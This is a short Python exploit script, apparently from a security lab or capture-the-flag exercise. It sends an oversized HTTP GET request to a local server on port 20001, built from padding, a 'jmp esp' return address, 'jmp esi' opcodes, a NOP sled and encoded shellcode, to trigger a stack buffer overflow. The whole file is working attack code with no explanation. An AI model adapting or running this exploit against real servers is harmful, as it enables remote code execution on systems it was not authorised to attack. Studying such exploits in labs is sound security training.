#!/usr/bin/python

from socket import *  
from struct import *

s = socket(AF_INET, SOCK_STREAM)  
s.connect(("localhost", 20001))

shellcode = "\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x5f\x81\xef\xdf\xff\xff\xff\x57\x5e\x29\xc9\x80\xc1\xb8\x8a\x07\x2c\x41\xc0\xe0\x04\x47\x02\x07\x2c\x41\x88\x06\x46\x47\x49\xe2\xedDBMAFAEAIJMDFAEAFAIJOBLAGGMNIADBNCFCGGGIBDNCEDGGFDIJOBGKBAFBFAIJOBLAGGMNIAEAIJEECEAEEDEDLAGGMNIAIDMEAMFCFCEDLAGGMNIAJDIJNBLADPMNIAEBIAPJADHFPGFCGIGOCPHDGIGICPCPGCGJIJODFCFDIJOBLAALMNIA"

ret = "\x4f\x9f\x04\x08" #jmp esp  
jmpesi = "\xff\xe6\x90\x90" # jmp esi opcodes  
payload =  "GET " + "A"*139 + ret + jmpesi + " HTTP/1.1" + "\x90"*16 +  shellcode
s.send(payload)  
s.close()  
